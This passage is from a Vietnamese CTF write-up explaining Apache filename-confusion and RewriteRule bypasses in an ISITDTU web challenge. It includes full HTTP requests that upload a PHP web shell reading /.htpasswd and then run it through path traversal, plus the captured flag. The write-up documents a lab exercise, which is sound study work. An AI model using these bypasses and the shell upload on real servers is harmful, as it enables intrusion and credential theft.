</code></pre><p>Nguyên nhân do ngữ nghĩa không nhất quán về r-&gt;filename giữa các mô-đun. Hầu hết các Proxy đều coi r-&gt;filename như một đường dẫn hệ thống tệp thay vì url do việc chuyển hướng các yêu cầu như ở đây nó chuyển hướng đến  với fcgi đến cho intepreter thực hiện xử lí file php.</p>
<p>Nên ta dùng <code>/admin.php%3Fooo.php</code> có thể bypass được match của .htaccess</p>
<p>Nguồn: <a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/#%E2%9C%94%EF%B8%8F-1-1-1-Path-Truncation">https://blog.orange.tw/posts/2024-08-confusion-attacks-en/#%E2%9C%94%EF%B8%8F-1-1-1-Path-Truncation</a></p>
<p><strong>bypass RewriteRule</strong></p>
<pre><code>RewriteEngine On
    RewriteRule  ^/website-(.*).doc$   /$1.html
</code></pre><p><code>/website-/usr/share/vulnx/shell/VulnX.php%3fVuln=X&amp;a.doc</code></p>
<p>ở đây ta thấy regex sẽ match tất cả chuỗi bắt đầu bằng <code>/website-</code> sau đó $1 sẽ là bất kì chuỗi nào nằm sau và kết thúc bằng .doc</p>
<p>Lúc này phần còn lại là <code>/usr/share/vulnx/shell/VulnX.php%3fVuln=X&amp;a</code> được match lần đầu tiên nên $1 = <code>/usr/share/vulnx/shell/VulnX.php%3fVuln=X&amp;a</code></p>
<p>Và việc redirect sẽ dẫn đến <code>/usr/share/vulnx/shell/VulnX.php%3fVuln=X&amp;a.html</code> lúc này phần đằng sau sẽ được coi như là một param và lược bỏ ta sẽ access đến <code>/usr/share/vulnx/shell/VulnX.php%3f</code></p>
<h3 id="exploit">exploit</h3>
<p><img src="https://hackmd.io/_uploads/SyTJPjclkl.png" alt="image"></p>
<pre><code>POST /website-/usr/share/vulnx/shell/VulnX.php%3fVuln=X&amp;a.doc HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/website-/usr/share/vulnx/shell/VulnX.php%3fVuln=X&amp;a.doc
Content-Type: multipart/form-data; boundary=---------------------------2778427660522729618720203579
Content-Length: 371
Origin: http://localhost
Connection: close
Cookie: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; COMPANY_ID=10155; USER_UUID=&quot;jiImVDJvR9FvHsC9ILRngv9QY7WiCc4KxubG7TEzTpM=&quot;; LOGIN=6c6d616f40676d61696c2e636f6d; REMEMBER_ME=true; SCREEN_NAME=65304e4e5442436764486f7678336750624b676a43773d3d; ID=4b4432493933576971666767794e6e4a5a78463047773d3d; PASSWORD=4e6a69664a726f41724461424c6454534651486b54673d3d
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

-----------------------------2778427660522729618720203579
Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;shell.html&quot;
Content-Type: application/octet-stream

&lt;?php system('cat /.htpasswd');?&gt;

-----------------------------2778427660522729618720203579
Content-Disposition: form-data; name=&quot;Submit&quot;

Upload
-----------------------------2778427660522729618720203579--
</code></pre><pre><code>GET /admin.php%3fooo.php?pages=../../../../../usr/share/vulnx/shell/uploads/shell HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; COMPANY_ID=10155; USER_UUID=&quot;jiImVDJvR9FvHsC9ILRngv9QY7WiCc4KxubG7TEzTpM=&quot;; LOGIN=6c6d616f40676d61696c2e636f6d; REMEMBER_ME=true; SCREEN_NAME=65304e4e5442436764486f7678336750624b676a43773d3d; ID=4b4432493933576971666767794e6e4a5a78463047773d3d; PASSWORD=4e6a69664a726f41724461424c6454534651486b54673d3d
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
</code></pre><p><img src="https://hackmd.io/_uploads/H18zDsce1l.png" alt="image"></p>
<p>flag: <code>ISITDTU{5e85c3b7f62b1dd9a990530c03f39abaa78f7085}</code></p>


        
          <div class="blog-tags">
            
              
              <a href="https://l3mnt2010.github.io/tags/ctf/">CTF</a>&nbsp;
            
              
              <a href="https://l3mnt2010.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
            
          </div>
        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://l3mnt2010.github.io/write-up/2024-05-13-kcscctf2024/" data-toggle="tooltip" data-placement="top" title="KCSC CTF 2024 - WEB &#39;s challenges">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="https://l3mnt2010.github.io/write-up/2024-04-26-insomnihack2024/" data-toggle="tooltip" data-placement="top" title="Insomni&#39;hack2024 - WEB &#39;s challenges">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

      <footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
          
        </ul>
        <p class="credits copyright text-muted">
          

          &nbsp;&bull;&nbsp;&copy;
          
            0001
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://l3mnt2010.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://l3mnt2010.github.io/js/load-photoswipe.js"></script>










    
  </body>
</html>

